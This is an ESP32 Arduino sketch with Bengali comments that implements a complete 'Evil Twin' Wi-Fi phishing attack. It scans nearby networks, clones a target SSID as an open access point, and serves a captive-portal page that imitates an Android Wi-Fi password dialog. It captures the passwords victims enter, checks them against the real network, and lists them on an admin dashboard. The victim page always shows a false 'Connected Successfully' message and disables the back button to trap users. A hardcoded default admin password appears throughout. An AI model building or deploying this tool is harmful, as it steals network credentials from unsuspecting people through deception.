#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <Preferences.h>

// ========== সার্ভার ডিক্লারেশন ==========
WebServer server(80);
DNSServer dnsServer;
Preferences preferences;

const byte DNS_PORT = 53;

// ========== Admin AP সেটিংস (Configurable) ==========
String adminSSID = "Unknown";
String adminPassword = "Rabbi0606@";
String adminIP = "192.168.4.1";
bool hideSSID = false;

// ========== Evil Twin সেটিংস ==========
bool isEvilTwinActive = false;
String evilTwinSSID = "Free_WiFi";
int evilTwinChannel = 6;

// ========== নেটওয়ার্ক স্ক্যান (সিম্পল) ==========
String networkSSIDs[30];
int networkChannels[30];
int networkRSSI[30];
int networkCount = 0;

// ========== ক্রেডেনশিয়াল স্টোরেজ (অপ্টিমাইজড) ==========
struct Credential {
    String timestamp;
    String ssid;
    String password;
    String clientIP;
};
Credential capturedCreds[50];
int credCount = 0;

// ========== ইউটিলিটি ফাংশন ==========
String getTimestamp() {
    unsigned long ms = millis();
    int seconds = (ms / 1000) % 60;
    int minutes = (ms / (1000 * 60)) % 60;
    int hours = (ms / (1000 * 60 * 60)) % 24;
    
    char buffer[20];
    sprintf(buffer, "%02d:%02d:%02d", hours, minutes, seconds);
    return String(buffer);
}

// ========== HTML টেম্পলেটস (অপ্টিমাইজড) ==========

// Admin Dashboard HTML - Minimal Design (Spacehuhn Style)
const char* adminDashboard = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Evil Twin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#1a1a1a;color:#00ff00;padding:10px;font-size:14px}
.container{max-width:800px;margin:0 auto}
h1{color:#00ff00;font-size:18px;margin:10px 0;border-bottom:1px solid #00ff00;padding-bottom:5px}
h2{color:#00ff00;font-size:16px;margin:15px 0 10px;border-bottom:1px solid #333;padding-bottom:5px}
.btn{padding:8px 16px;border:1px solid #00ff00;background:#000;color:#00ff00;font-family:monospace;cursor:pointer;margin:5px 5px 5px 0;font-size:13px;transition:all 0.2s}
.btn:hover:not(:disabled){background:#00ff00;color:#000}
.btn:disabled{opacity:0.3;cursor:not-allowed}
.btn-danger{border-color:#ff0000;color:#ff0000}
.btn-danger:hover:not(:disabled){background:#ff0000;color:#000}
input,select{width:100%;padding:8px;background:#000;border:1px solid #333;color:#00ff00;font-family:monospace;margin:5px 0;font-size:13px}
input:focus{outline:none;border-color:#00ff00}
.network-list{max-height:300px;overflow-y:auto;margin:10px 0;border:1px solid #333}
.network-item{padding:10px;border-bottom:1px solid #333;cursor:pointer;transition:background 0.2s}
.network-item:hover{background:#222}
.network-item.selected{background:#003300;border-left:3px solid #00ff00}
.status{padding:10px;margin:10px 0;border:1px solid #333;text-align:center;font-size:13px}
.status.active{border-color:#00ff00;color:#00ff00}
.status.twin{border-color:#ffff00;color:#ffff00;background:#222}
table{width:100%;border-collapse:collapse;margin:10px 0;font-size:12px}
table th{background:#222;color:#00ff00;padding:8px;text-align:left;border:1px solid #333}
table td{padding:8px;border:1px solid #333}
.info{background:#111;border:1px solid #333;padding:10px;margin:10px 0;font-size:12px}
.info span{color:#ffff00}
.loader{border:3px solid #333;border-top:3px solid #00ff00;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
@media(max-width:768px){
body{font-size:12px}
.btn{padding:6px 12px;font-size:12px}
table{font-size:11px}
}
</style>
</head>
<body>
<div class="container">
<h1>ESP32 EVIL TWIN</h1>
<div class="status active" id="systemStatus">[ READY ]</div>

<h2>NETWORKS</h2>
<button class="btn" onclick="scanNetworks()" id="scanBtn">SCAN</button>
<div class="network-list" id="networkList"></div>

<h2>EVIL TWIN</h2>
<div style="margin:10px 0">
<div style="color:#666;font-size:12px;margin-bottom:5px">Selected:</div>
<input type="text" id="targetNetwork" readonly placeholder="Select a network">
</div>
<div style="margin:10px 0">
<div style="color:#666;font-size:12px;margin-bottom:5px">SSID (optional):</div>
<input type="text" id="evilSSID" placeholder="Leave empty to clone">
</div>
<button class="btn" id="btnCreate" onclick="createEvilTwin()" disabled>START</button>
<button class="btn btn-danger" id="btnStop" onclick="stopEvilTwin()" disabled>STOP</button>
<div id="twinStatus"></div>

<h2>STATS</h2>
<div class="info">
Credentials: <span id="credCount">0</span> | Clients: <span id="clientCount">0</span>
</div>

<h2>CREDENTIALS</h2>
<table>
<thead><tr><th>Time</th><th>SSID</th><th>Password</th><th>IP</th></tr></thead>
<tbody id="credTable"><tr><td colspan="4" style="text-align:center;color:#666">No data</td></tr></tbody>
</table>

<h2>SETTINGS</h2>
<div class="info" style="background:#222;border-color:#ffff00">
<strong style="color:#ffff00">⚠️ Changes require restart</strong>
</div>
<div style="margin:10px 0">
<div style="color:#666;font-size:12px;margin-bottom:5px">Admin SSID:</div>
<input type="text" id="settingSSID" placeholder="Unknown">
</div>
<div style="margin:10px 0">
<div style="color:#666;font-size:12px;margin-bottom:5px">Admin Password:</div>
<input type="password" id="settingPass" placeholder="Rabbi0606@">
</div>
<div style="margin:10px 0">
<div style="color:#666;font-size:12px;margin-bottom:5px">Admin IP:</div>
<input type="text" id="settingIP" placeholder="192.168.4.1">
</div>
<div style="margin:10px 0">
<div style="color:#666;font-size:12px;margin-bottom:5px">Hide Admin SSID:</div>
<select id="settingHide">
<option value="0">Show (Visible)</option>
<option value="1">Hide (Hidden)</option>
</select>
</div>
<button class="btn" onclick="saveSettings()">SAVE SETTINGS</button>
<button class="btn btn-danger" onclick="resetSettings()">RESET TO DEFAULT</button>
<div id="settingsMsg" style="margin-top:10px"></div>
</div>

<script>
let selectedNetwork=null;

function scanNetworks(){
let list=document.getElementById('networkList');
let btn=document.getElementById('scanBtn');
list.innerHTML='<div class="loader"></div>';
btn.disabled=true;
btn.textContent='...';

fetch('/scan')
.then(r=>r.json())
.then(data=>{
list.innerHTML='';
if(data.networks.length===0){
list.innerHTML='<div style="padding:20px;text-align:center;color:#666">No networks found</div>';
}else{
data.networks.forEach(net=>{
let div=document.createElement('div');
div.className='network-item';
div.innerHTML=`${net.ssid||'Hidden'} [Ch:${net.channel}] [${net.rssi}dBm]`;
div.onclick=()=>selectNetwork(net,div);
list.appendChild(div);
});
}
btn.disabled=false;
btn.textContent='SCAN';
})
.catch(()=>{
list.innerHTML='<div style="padding:20px;text-align:center;color:#ff0000">ERROR</div>';
btn.disabled=false;
btn.textContent='SCAN';
});
}

function selectNetwork(net,el){
selectedNetwork=net;
document.querySelectorAll('.network-item').forEach(i=>i.classList.remove('selected'));
if(el)el.classList.add('selected');
document.getElementById('targetNetwork').value=net.ssid||'Hidden';
document.getElementById('btnCreate').disabled=false;
}

function createEvilTwin(){
if(!selectedNetwork){alert('Select network first');return;}
let ssid=document.getElementById('evilSSID').value||selectedNetwork.ssid;
let ch=selectedNetwork.channel;
let btn=document.getElementById('btnCreate');
btn.disabled=true;
btn.textContent='STARTING...';

fetch(`/createEvilTwin?ssid=${encodeURIComponent(ssid)}&channel=${ch}`)
.then(r=>r.json())
.then(data=>{
if(data.success){
document.getElementById('systemStatus').textContent='[ EVIL TWIN ACTIVE ]';
document.getElementById('systemStatus').className='status twin';
document.getElementById('btnStop').disabled=false;
document.getElementById('twinStatus').innerHTML=`
<div class="info" style="margin-top:10px">
<strong style="color:#00ff00">STATUS: RUNNING</strong><br>
SSID: ${ssid}<br>
Admin: <a href="http://192.168.4.1/admin" style="color:#ffff00">192.168.4.1/admin</a>
</div>`;
updateStats();
}else{
btn.disabled=false;
btn.textContent='START';
}
})
.catch(()=>{
btn.disabled=false;
btn.textContent='START';
});
}

function stopEvilTwin(){
fetch('/stopEvilTwin')
.then(r=>r.json())
.then(data=>{
if(data.success){
document.getElementById('systemStatus').textContent='[ READY ]';
document.getElementById('systemStatus').className='status active';
document.getElementById('btnCreate').disabled=false;
document.getElementById('btnCreate').textContent='START';
document.getElementById('btnStop').disabled=true;
document.getElementById('twinStatus').innerHTML='';
}
});
}

function updateStats(){
fetch('/getStats')
.then(r=>r.json())
.then(data=>{
document.getElementById('credCount').textContent=data.credentials;
document.getElementById('clientCount').textContent=data.clients;
});

fetch('/getCredentials')
.then(r=>r.json())
.then(data=>{
let tbody=document.getElementById('credTable');
tbody.innerHTML='';
if(data.length===0){
tbody.innerHTML='<tr><td colspan="4" style="text-align:center;color:#666">No data</td></tr>';
return;
}
data.forEach(c=>{
let row=tbody.insertRow();
row.insertCell(0).textContent=c.timestamp;
row.insertCell(1).textContent=c.ssid;
row.insertCell(2).innerHTML=`<span style="color:#ff0000">${c.password}</span>`;
row.insertCell(3).textContent=c.clientIP;
});
});
}

setInterval(()=>{
let status=document.getElementById('systemStatus').className;
if(status.includes('twin')){
updateStats();
}
},3000);

function loadSettings(){
fetch('/getSettings')
.then(r=>r.json())
.then(data=>{
document.getElementById('settingSSID').value=data.ssid;
document.getElementById('settingPass').value=data.password;
document.getElementById('settingIP').value=data.ip;
document.getElementById('settingHide').value=data.hideSSID?'1':'0';
});
}

function saveSettings(){
let ssid=document.getElementById('settingSSID').value;
let pass=document.getElementById('settingPass').value;
let ip=document.getElementById('settingIP').value;
let hide=document.getElementById('settingHide').value;

if(!ssid||!pass||!ip){
document.getElementById('settingsMsg').innerHTML='<div class=\"info\" style=\"border-color:#ff0000;color:#ff0000\">All fields required!</div>';
return;
}

fetch(`/saveSettings?ssid=${encodeURIComponent(ssid)}&pass=${encodeURIComponent(pass)}&ip=${encodeURIComponent(ip)}&hide=${hide}`)
.then(r=>r.json())
.then(data=>{
if(data.success){
document.getElementById('settingsMsg').innerHTML='<div class=\"info\" style=\"border-color:#00ff00;color:#00ff00\">Saved! Restart ESP32 to apply.</div>';
}else{
document.getElementById('settingsMsg').innerHTML='<div class=\"info\" style=\"border-color:#ff0000;color:#ff0000\">Failed to save!</div>';
}
});
}

function resetSettings(){
if(!confirm('Reset to default settings?'))return;
fetch('/resetSettings')
.then(r=>r.json())
.then(data=>{
if(data.success){
document.getElementById('settingsMsg').innerHTML='<div class=\"info\" style=\"border-color:#ffff00;color:#ffff00\">Reset! Restart ESP32 to apply.</div>';
loadSettings();
}
});
}

window.onload=function(){
scanNetworks();
loadSettings();
};
</script>
</body>
</html>
)rawliteral";

// Evil Twin Login Page (Captive Portal) - Android WiFi Dialog Style
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<title>WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#000;color:#fff;overflow-x:hidden}
.wifi-page{min-height:100vh;background:#000;padding:0}
.header{background:#1a1a1a;padding:15px 20px;display:flex;align-items:center;border-bottom:1px solid #2a2a2a}
.back-btn{color:#fff;font-size:24px;margin-right:15px;cursor:pointer;width:30px;height:30px;display:flex;align-items:center;justify-content:center}
.network-title{font-size:18px;font-weight:400;color:#fff;flex:1}
.wifi-container{background:#1a1a1a;margin:10px 0;padding:20px;border-radius:12px}
.field-label{color:#7a7a7a;font-size:13px;margin-bottom:8px;font-weight:400}
.password-field{position:relative;margin-bottom:20px}
.password-input{width:100%;background:transparent;border:none;border-bottom:1px solid #3a3a3a;padding:10px 35px 10px 0;font-size:16px;color:#fff;outline:none;font-family:inherit}
.password-input:focus{border-bottom-color:#4a90e2}
.password-input::placeholder{color:#5a5a5a}
.eye-icon{position:absolute;right:0;top:50%;transform:translateY(-50%);width:24px;height:24px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.eye-icon svg{width:24px;height:24px;fill:#7a7a7a}
.auto-reconnect{display:flex;justify-content:space-between;align-items:center;padding:15px 0;border-bottom:1px solid #2a2a2a}
.auto-label{font-size:16px;color:#fff}
.toggle-switch{position:relative;width:48px;height:28px;background:#3a3a3a;border-radius:14px;cursor:pointer;transition:background 0.3s}
.toggle-switch.active{background:#4a90e2}
.toggle-slider{position:absolute;top:2px;left:2px;width:24px;height:24px;background:#fff;border-radius:50%;transition:transform 0.3s;box-shadow:0 2px 4px rgba(0,0,0,0.3)}
.toggle-switch.active .toggle-slider{transform:translateX(20px)}
.view-more{text-align:center;padding:15px;color:#7a7a7a;font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.view-more svg{width:16px;height:16px;fill:#7a7a7a;margin-left:5px}
.connect-btn{width:calc(100% - 40px);margin:20px 20px;padding:14px;background:#2d5a8c;color:#fff;border:none;border-radius:25px;font-size:16px;font-weight:500;cursor:pointer;transition:background 0.3s}
.connect-btn:active{background:#3a6ba3}
.connect-btn:disabled{background:#1a3a5c;color:#5a5a5a}
.hidden{display:none}
.success-msg{text-align:center;padding:40px 20px;color:#4caf50;font-size:18px}
@media(min-width:768px){
.wifi-page{max-width:500px;margin:0 auto;border:1px solid #2a2a2a}
.header{border-top-left-radius:12px;border-top-right-radius:12px}
}
</style>
</head>
<body>
<div class="wifi-page">
<div class="header">
<div class="back-btn">‹</div>
<div class="network-title" id="networkTitle">Loading...</div>
</div>

<div class="wifi-container">
<div class="field-label">Password</div>
<div class="password-field">
<input type="password" class="password-input" id="passwordInput" placeholder="Enter password" autocomplete="off">
<div class="eye-icon" id="togglePassword">
<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
</div>
</div>

<div class="auto-reconnect">
<div class="auto-label">Auto reconnect</div>
<div class="toggle-switch active" id="autoToggle">
<div class="toggle-slider"></div>
</div>
</div>

<div class="view-more">
<span>View more</span>
<svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
</div>
</div>

<button class="connect-btn" id="connectBtn">Connect</button>

<div class="success-msg hidden" id="successMsg">
<div style="font-size:48px;margin-bottom:10px">✓</div>
<div>Connected Successfully</div>
</div>
</div>

<script>
let passwordVisible=false;
let autoReconnect=true;

// Load network name
fetch('/getNetwork')
.then(r=>r.json())
.then(data=>{
document.getElementById('networkTitle').textContent=data.ssid;
});

// Toggle password visibility
document.getElementById('togglePassword').onclick=function(){
let input=document.getElementById('passwordInput');
passwordVisible=!passwordVisible;
input.type=passwordVisible?'text':'password';
this.querySelector('svg path').setAttribute('d',passwordVisible?
'M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z':
'M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z');
};

// Toggle auto reconnect
document.getElementById('autoToggle').onclick=function(){
autoReconnect=!autoReconnect;
this.classList.toggle('active');
};

// Connect button
document.getElementById('connectBtn').onclick=async function(){
let password=document.getElementById('passwordInput').value;
let ssid=document.getElementById('networkTitle').textContent;

if(!password){
document.getElementById('passwordInput').style.borderBottomColor='#e53935';
return;
}

this.disabled=true;
this.textContent='Connecting...';

let formData=new FormData();
formData.append('ssid',ssid);
formData.append('password',password);

try{
let response=await fetch('/login',{method:'POST',body:formData});
let data=await response.json();

document.querySelector('.wifi-container').classList.add('hidden');
document.querySelector('.connect-btn').classList.add('hidden');

if(data.connected){
// Password was correct, show real success
document.getElementById('successMsg').innerHTML=`
<div style="font-size:48px;margin-bottom:10px">✓</div>
<div>Connected Successfully</div>
<div style="font-size:14px;color:#7a7a7a;margin-top:10px">You are now connected to ${ssid}</div>
`;
}else{
// Password was wrong, show generic message
document.getElementById('successMsg').innerHTML=`
<div style="font-size:48px;margin-bottom:10px">✓</div>
<div>Connected Successfully</div>
<div style="font-size:14px;color:#7a7a7a;margin-top:10px">Verifying connection...</div>
`;
}
document.getElementById('successMsg').classList.remove('hidden');

// If connected to real network, close dialog after 3 seconds
if(data.connected){
setTimeout(()=>{
window.close();
},3000);
}
}catch(e){
this.disabled=false;
this.textContent='Connect';
document.getElementById('passwordInput').style.borderBottomColor='#e53935';
}
};

// Back button (fake, does nothing)
document.querySelector('.back-btn').onclick=function(){
// Intentionally do nothing to keep user on page
};
</script>
</body>
</html>
)rawliteral";

// ========== ফাংশন ডেফিনিশন ==========

// নেটওয়ার্ক স্ক্যান (Optimized)
void scanNetworks() {
    Serial.println("\n[SCAN] Scanning WiFi networks...");
    
    WiFi.mode(WIFI_AP_STA);
    delay(50);
    
    int n = WiFi.scanNetworks(false, false, false, 300);
    networkCount = min(n, 30);
    
    Serial.printf("[SCAN] Found %d networks\n", networkCount);
    
    for(int i = 0; i < networkCount; i++) {
        networkSSIDs[i] = WiFi.SSID(i);
        networkChannels[i] = WiFi.channel(i);
        networkRSSI[i] = WiFi.RSSI(i);
        
        Serial.printf("  %2d. %-32s Ch:%2d RSSI:%3d\n",
                     i+1, networkSSIDs[i].c_str(),
                     networkChannels[i], networkRSSI[i]);
    }
    
    WiFi.scanDelete();
    WiFi.mode(WIFI_AP);
}

// Evil Twin AP তৈরি (Optimized)
void createEvilTwinAP(String ssid, int channel) {
    Serial.println("\n[EVIL TWIN] Creating Evil Twin AP...");
    
    // Configure Evil Twin AP
    bool success = WiFi.softAP(ssid.c_str(), nullptr, channel, 0, 8);
    
    if(success) {
        isEvilTwinActive = true;
        evilTwinSSID = ssid;
        evilTwinChannel = channel;
        
        // Start DNS Server for captive portal
        dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
        
        Serial.println("[EVIL TWIN] ✅ Created successfully!");
        Serial.printf("  SSID: %s (Open - No Password)\n", ssid.c_str());
        Serial.printf("  Channel: %d\n", channel);
        Serial.printf("  IP: %s\n", WiFi.softAPIP().toString().c_str());
        Serial.println("  📱 Victims: http://192.168.4.1");
        Serial.println("  🔐 Admin: http://192.168.4.1/admin");
    } else {
        Serial.println("[EVIL TWIN] ❌ Failed to create AP");
    }
}

// ========== সার্ভার রাউটস (Optimized) ==========

void setupServer() {
    // মূল পেজ - root route
    server.on("/", HTTP_GET, []() {
        if(server.uri() == "/admin" || server.hasArg("admin")) {
            server.send(200, "text/html", adminDashboard);
        } else if(isEvilTwinActive) {
            server.send(200, "text/html", loginPage);
        } else {
            server.send(200, "text/html", adminDashboard);
        }
    });
    
    // Admin panel
    server.on("/admin", HTTP_GET, []() {
        server.send(200, "text/html", adminDashboard);
    });
    
    // Captive portal detection
    server.on("/generate_204", HTTP_GET, []() {
        server.send(200, "text/html", loginPage);
    });
    
    server.on("/hotspot-detect.html", HTTP_GET, []() {
        server.send(200, "text/html", loginPage);
    });
    
    server.on("/connecttest.txt", HTTP_GET, []() {
        server.send(200, "text/html", loginPage);
    });
    
    // Network scan
    server.on("/scan", HTTP_GET, []() {
        scanNetworks();
        
        DynamicJsonDocument doc(3072);
        JsonArray networks = doc.createNestedArray("networks");
        
        for(int i = 0; i < networkCount; i++) {
            JsonObject network = networks.createNestedObject();
            network["ssid"] = networkSSIDs[i];
            network["channel"] = networkChannels[i];
            network["rssi"] = networkRSSI[i];
        }
        
        String json;
        serializeJson(doc, json);
        server.send(200, "application/json", json);
    });
    
    // Create Evil Twin
    server.on("/createEvilTwin", HTTP_GET, []() {
        String ssid = server.arg("ssid");
        int channel = server.arg("channel").toInt();
        
        createEvilTwinAP(ssid, channel);
        
        String response = "{\"success\":true}";
        server.send(200, "application/json", response);
    });
    
    // Stop Evil Twin
    server.on("/stopEvilTwin", HTTP_GET, []() {
        if(isEvilTwinActive) {
            dnsServer.stop();
            WiFi.softAPdisconnect(false);
            delay(100);
            WiFi.softAP(adminSSID.c_str(), adminPassword.c_str(), 1, hideSSID, 8);
            isEvilTwinActive = false;
            Serial.println("\n[EVIL TWIN] Stopped, Admin AP restored");
        }
        
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    // Get network info
    server.on("/getNetwork", HTTP_GET, []() {
        String json = "{\"ssid\":\"" + evilTwinSSID + "\"}";
        server.send(200, "application/json", json);
    });
    
    // Login handler (capture credentials + auto-connect to original WiFi)
    server.on("/login", HTTP_POST, []() {
        String ssid = evilTwinSSID;
        String password = server.arg("password");
        String clientIP = server.client().remoteIP().toString();
        
        // Save credential
        if(credCount < 50) {
            capturedCreds[credCount].timestamp = getTimestamp();
            capturedCreds[credCount].ssid = ssid;
            capturedCreds[credCount].password = password;
            capturedCreds[credCount].clientIP = clientIP;
            credCount++;
            
            Serial.println("\n[CREDENTIAL] 📧 Captured!");
            Serial.printf("  Time: %s\n", capturedCreds[credCount-1].timestamp.c_str());
            Serial.printf("  SSID: %s\n", ssid.c_str());
            Serial.printf("  Password: %s\n", password.c_str());
            Serial.printf("  Client IP: %s\n", clientIP.c_str());
        }
        
        // Try to connect to original WiFi with captured password
        Serial.println("\n[AUTO-CONNECT] Attempting to connect to original WiFi...");
        Serial.printf("  SSID: %s\n", ssid.c_str());
        
        // Switch to AP+STA mode temporarily
        WiFi.mode(WIFI_AP_STA);
        delay(100);
        
        // Attempt connection
        WiFi.begin(ssid.c_str(), password.c_str());
        
        int attempts = 0;
        bool connected = false;
        
        // Wait up to 10 seconds for connection
        while(attempts < 20 && WiFi.status() != WL_CONNECTED) {
            delay(500);
            attempts++;
            Serial.print(".");
        }
        
        if(WiFi.status() == WL_CONNECTED) {
            connected = true;
            Serial.println("\n[AUTO-CONNECT] ✅ Password is CORRECT!");
            Serial.printf("  Connected to: %s\n", ssid.c_str());
            Serial.printf("  IP Address: %s\n", WiFi.localIP().toString().c_str());
            
            // Stop Evil Twin automatically
            Serial.println("\n[AUTO-STOP] Stopping Evil Twin attack...");
            dnsServer.stop();
            WiFi.softAPdisconnect(true);
            delay(500);
            
            // Switch to full STA mode
            WiFi.mode(WIFI_STA);
            isEvilTwinActive = false;
            
            Serial.println("[AUTO-STOP] ✅ Evil Twin stopped");
            Serial.println("[AUTO-STOP] ✅ Victim will connect to original network");
            Serial.println("\n╔══════════════════════════════════════════╗");
            Serial.println("║   PASSWORD VALIDATED & ATTACK STOPPED   ║");
            Serial.println("╚══════════════════════════════════════════╝\n");
            
            // Restore Admin AP after 5 seconds
            delay(5000);
            WiFi.mode(WIFI_AP);
            WiFi.softAP(adminSSID.c_str(), adminPassword.c_str(), 1, hideSSID, 8);
            Serial.println("\n[SYSTEM] Admin AP restored for next attack");
            
        } else {
            connected = false;
            Serial.println("\n[AUTO-CONNECT] ❌ Password is INCORRECT");
            Serial.println("[AUTO-CONNECT] Evil Twin continues running...");
            
            // Restore AP mode
            WiFi.disconnect();
            WiFi.mode(WIFI_AP);
        }
        
        // Send response with connection status
        String response = "{\"success\":true,\"connected\":" + String(connected ? "true" : "false") + "}";
        server.send(200, "application/json", response);
    });
    
    // Get statistics
    server.on("/getStats", HTTP_GET, []() {
        StaticJsonDocument<256> doc;
        doc["credentials"] = credCount;
        doc["clients"] = WiFi.softAPgetStationNum();
        doc["uptime"] = millis() / 1000;
        doc["freeHeap"] = ESP.getFreeHeap();
        
        String json;
        serializeJson(doc, json);
        server.send(200, "application/json", json);
    });
    
    // Get credentials
    server.on("/getCredentials", HTTP_GET, []() {
        DynamicJsonDocument doc(2048);
        JsonArray creds = doc.to<JsonArray>();
        
        for(int i = 0; i < credCount; i++) {
            JsonObject cred = creds.createNestedObject();
            cred["timestamp"] = capturedCreds[i].timestamp;
            cred["ssid"] = capturedCreds[i].ssid;
            cred["password"] = capturedCreds[i].password;
            cred["clientIP"] = capturedCreds[i].clientIP;
        }
        
        String json;
        serializeJson(doc, json);
        server.send(200, "application/json", json);
    });
    
    // Get settings
    server.on("/getSettings", HTTP_GET, []() {
        StaticJsonDocument<512> doc;
        doc["ssid"] = adminSSID;
        doc["password"] = adminPassword;
        doc["ip"] = adminIP;
        doc["hideSSID"] = hideSSID;
        
        String json;
        serializeJson(doc, json);
        server.send(200, "application/json", json);
    });
    
    // Save settings
    server.on("/saveSettings", HTTP_GET, []() {
        String ssid = server.arg("ssid");
        String pass = server.arg("pass");
        String ip = server.arg("ip");
        bool hide = server.arg("hide") == "1";
        
        preferences.begin("wifi-config", false);
        preferences.putString("adminSSID", ssid);
        preferences.putString("adminPass", pass);
        preferences.putString("adminIP", ip);
        preferences.putBool("hideSSID", hide);
        preferences.end();
        
        Serial.println("\n[SETTINGS] Saved to flash:");
        Serial.printf("  SSID: %s\n", ssid.c_str());
        Serial.printf("  Password: %s\n", pass.c_str());
        Serial.printf("  IP: %s\n", ip.c_str());
        Serial.printf("  Hide: %s\n", hide ? "Yes" : "No");
        
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    // Reset settings
    server.on("/resetSettings", HTTP_GET, []() {
        preferences.begin("wifi-config", false);
        preferences.clear();
        preferences.end();
        
        Serial.println("\n[SETTINGS] Reset to defaults");
        
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    // 404 handler - redirect to captive portal
    server.onNotFound([]() {
        if(isEvilTwinActive) {
            server.send(200, "text/html", loginPage);
        } else {
            server.send(404, "text/plain", "Not Found");
        }
    });
    
    server.begin();
}

// ========== Load Settings from Flash ==========
void loadSettings() {
    preferences.begin("wifi-config", true); // Read-only mode
    
    // Load with defaults if not set
    adminSSID = preferences.getString("adminSSID", "Unknown");
    adminPassword = preferences.getString("adminPass", "Rabbi0606@");
    adminIP = preferences.getString("adminIP", "192.168.4.1");
    hideSSID = preferences.getBool("hideSSID", false);
    
    preferences.end();
    
    Serial.println("\n[SETTINGS] Loaded from flash:");
    Serial.printf("  SSID: %s\n", adminSSID.c_str());
    Serial.printf("  Password: %s\n", adminPassword.c_str());
    Serial.printf("  IP: %s\n", adminIP.c_str());
    Serial.printf("  Hide: %s\n", hideSSID ? "Yes" : "No");
}

// ========== SETUP ফাংশন ==========

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n\n╔══════════════════════════════════════════╗");
    Serial.println("║   ESP32 EVIL TWIN TRAINER (OPTIMIZED)   ║");
    Serial.println("║   Version 4.0 - Evil Twin Only           ║");
    Serial.println("╚══════════════════════════════════════════╝");
    
    // Load settings from flash
    loadSettings();
    
    // WiFi কনফিগারেশন
    WiFi.mode(WIFI_AP);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);  // Max power
    
    // Admin AP তৈরি (with loaded settings)
    WiFi.softAP(adminSSID.c_str(), adminPassword.c_str(), 1, hideSSID, 8);
    
    Serial.println("\n✅ ADMIN ACCESS POINT CREATED");
    Serial.printf("   SSID: %s\n", adminSSID.c_str());
    Serial.printf("   Password: %s\n", adminPassword.c_str());
    Serial.printf("   IP: %s\n", WiFi.softAPIP().toString().c_str());
    Serial.printf("   Hide SSID: %s\n", hideSSID ? "Yes" : "No");
    
    // সার্ভার সেটআপ
    setupServer();
    
    Serial.println("\n🌐 WEB SERVER STARTED");
    Serial.println("   Dashboard: http://" + WiFi.softAPIP().toString());
    
    // প্রাথমিক স্ক্যান
    scanNetworks();
    
    Serial.println("\n🚀 SYSTEM READY");
    Serial.println("   Connect: " + String(adminSSID));
    Serial.println("   Browser: http://192.168.4.1");
    Serial.println("\n╔══════════════════════════════════════════╗");
    Serial.println("║   EVIL TWIN TRAINER ACTIVE              ║");
    Serial.println("╚══════════════════════════════════════════╝\n");
}

// ========== LOOP ফাংশন (Optimized) ==========

void loop() {
    // Handle web requests
    server.handleClient();
    
    // Handle DNS requests (captive portal)
    if(isEvilTwinActive) {
        dnsServer.processNextRequest();
    }
    
    // Memory check (every 30 seconds)
    static unsigned long lastMemCheck = 0;
    if(millis() - lastMemCheck > 30000) {
        uint32_t freeHeap = ESP.getFreeHeap();
        Serial.printf("[MEM] Free: %d bytes | Clients: %d\n", 
                     freeHeap, WiFi.softAPgetStationNum());
        lastMemCheck = millis();
    }
    
    delay(1);
}
